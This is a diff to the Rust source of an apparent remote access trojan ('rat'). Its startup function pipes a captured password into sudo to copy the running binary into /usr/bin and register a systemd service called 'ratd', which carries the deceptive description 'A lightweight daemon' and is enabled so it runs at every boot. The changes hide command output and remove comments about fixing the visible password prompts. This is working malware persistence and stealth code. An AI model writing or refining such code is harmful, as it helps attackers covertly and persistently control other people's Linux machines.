@@ -1,10 +1,7 @@
 use crate::extensions::Password;
-use std::{io::Write, path::PathBuf, process::Stdio};
+use std::{fs::File, io::Write, path::PathBuf, process::Stdio};
 
 pub fn startup() -> Password {
-    // Need to be fixed:
-    // Multiple sudo prompts
-    // Visible password entry
     if cfg!(target_os = "linux") {
         // grabbing the path of the current running executable
         let current_exe_path = std::env::current_exe().unwrap();
@@ -30,6 +27,7 @@ pub fn startup() -> Password {
                 .arg("-kS")
                 .args(["cp", current_exe_path.to_str().unwrap(), "/usr/bin/rat"])
                 .stdin(Stdio::piped())
+                .stdout(Stdio::null())
                 .stderr(Stdio::null())
                 .spawn()
                 .unwrap();
@@ -46,8 +44,7 @@ pub fn startup() -> Password {
             }
         };
 
-        let service = "
-[Unit]
+        let service = "[Unit]
 Description=A lightweight daemon
 After=network.target
 
@@ -61,9 +58,13 @@ WorkingDirectory=/var/rat/
 WantedBy=multi-user.target\n";
 
         // creating service file
+        let mut f = File::create("/tmp/ratd").unwrap();
+        let _ = f.write_all(&service.as_bytes());
+
         let mut child1 = std::process::Command::new("sudo")
-            .args(["-kS", "touch", "/etc/systemd/system/ratd.service"])
+            .args(["-kS", "mv", "/tmp/ratd", "/etc/systemd/system/ratd.service"])
             .stdin(Stdio::piped())
+            .stdout(Stdio::null())
             .stderr(Stdio::null())
             .spawn()
             .unwrap();
@@ -75,6 +76,7 @@ WantedBy=multi-user.target\n";
         let mut child2 = std::process::Command::new("sudo")
             .args(["-kS", "systemctl", "enable", "ratd.service"])
             .stdin(Stdio::piped())
+            .stdout(Stdio::null())
             .stderr(Stdio::null())
             .spawn()
             .unwrap();
